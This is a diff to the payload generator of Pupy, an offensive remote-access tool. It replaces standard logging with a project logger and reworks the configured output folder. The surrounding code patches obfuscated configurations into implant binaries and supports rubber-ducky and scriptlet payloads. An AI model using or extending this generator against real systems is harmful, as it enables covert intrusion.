@@ -3,7 +3,7 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
-import logging, argparse, sys, os.path, re, shlex, random, string
+import argparse, sys, os.path, re, shlex, random, string
 import zipfile, tarfile, tempfile, shutil, subprocess, traceback, pkgutil
 
 ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__)))
@@ -19,6 +19,7 @@ from pupylib.payloads.rubber_ducky import rubber_ducky
 from pupylib.utils.obfuscate import compress_encode_obfs
 from pupylib.PupyConfig import PupyConfig
 from pupylib.PupyCompile import pupycompile
+from pupylib.PupyLogger import getLogger
 from network.conf import transports, launchers
 from network.lib.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
@@ -39,10 +40,12 @@ import string
 import random
 import json
 
+logger = getLogger('gen')
+
 HARDCODED_CONF_SIZE=65536
 
 def get_edit_binary(path, conf, compressed_config=True, debug=False):
-    logging.debug("generating binary %s with conf: %s"%(path, conf))
+    logger.debug("generating binary %s with conf: %s"%(path, conf))
     binary=b""
     with open(path, 'rb') as f:
         binary=f.read()
@@ -75,14 +78,14 @@ def get_edit_binary(path, conf, compressed_config=True, debug=False):
 
     new_conf = new_conf + os.urandom(HARDCODED_CONF_SIZE-new_conf_len)
 
-    logging.debug('Free space: {}'.format(HARDCODED_CONF_SIZE-new_conf_len))
+    logger.debug('Free space: {}'.format(HARDCODED_CONF_SIZE-new_conf_len))
 
     offset = offsets[0]
     binary = binary[0:offset]+new_conf+binary[offset+HARDCODED_CONF_SIZE:]
     return binary
 
 def get_raw_conf(conf, obfuscate=False, verbose=False):
-     
+
     credentials = Credentials(role='client')
 
     if not "offline_script" in conf:
@@ -422,7 +425,7 @@ def load_scriptlets():
                 if module_name2=="generator":
                     module2=loader2.find_module(module_name2).load_module(module_name2)
                     if not hasattr(module2, 'ScriptletGenerator'):
-                        logging.error("scriptlet %s has no class ScriptletGenerator"%module_name2)
+                        logger.error("scriptlet %s has no class ScriptletGenerator"%module_name2)
                     else:
                         scl[module_name]=module2.ScriptletGenerator
     return scl
@@ -479,7 +482,7 @@ class ListOptions(argparse.Action):
             try:
                 print "\t- {:<14} : {}".format(name, tc.info)
             except Exception as e:
-                logging.error(e)
+                logger.error(e)
 
         print colorize("## available scriptlets :", "green")+" usage: -s <scriptlet>,<arg1>=<value>,<args2=value>..."
         scriptlets_dic=load_scriptlets()
@@ -509,7 +512,14 @@ def get_parser(base_parser, config):
     parser.add_argument('-P', '--packer', default=config.get('gen', 'packer'), help='Use packer when \'client\' output format (default: %(default)s)')
     parser.add_argument('-S', '--shared', default=False, action='store_true', help='Create shared object')
     parser.add_argument('-o', '--output', help="output filename")
-    parser.add_argument('-D', '--output-dir', default=config.get('gen', 'output'), help="output folder (default: %(default)s)")
+
+    default_payload_output = '.'
+    try:
+        default_payload_output = config.get_path('payload_output', dir=True)
+    except ValueError, e:
+        logger.error('Invalid value for "payload_output" in config file: {}'.format(e))
+
+    parser.add_argument('-D', '--output-dir', default=default_payload_output, help="output folder (default: %(default)s)")
     parser.add_argument('-s', '--scriptlet', default=[], action='append', help="offline python scriptlets to execute before starting the connection. Multiple scriptlets can be privided.")
     parser.add_argument('-l', '--list', action=ListOptions, nargs=0, help="list available formats, transports, scriptlets and options")
     parser.add_argument('-E', '--prefer-external', default=config.getboolean('gen', 'external'),
@@ -600,11 +610,11 @@ def pupygen(args, config):
     }
 
     outpath=args.output
-    
+
     if not os.path.isdir(args.output_dir):
         print ok+"Creating the local folder '{0}' for generating payloads".format(args.output_dir)
         os.makedirs(args.output_dir)
-    
+
     if args.format=="client":
         print ok+"Generate client: {}/{}".format(args.os, args.arch)
 
@@ -727,7 +737,7 @@ if __name__ == '__main__':
     except InvalidOptions:
         sys.exit(0)
     except EncryptionError, e:
-        logging.error(e)
+        logger.error(e)
     except Exception, e:
-        logging.exception(e)
+        logger.exception(e)
         sys.exit(str(e))
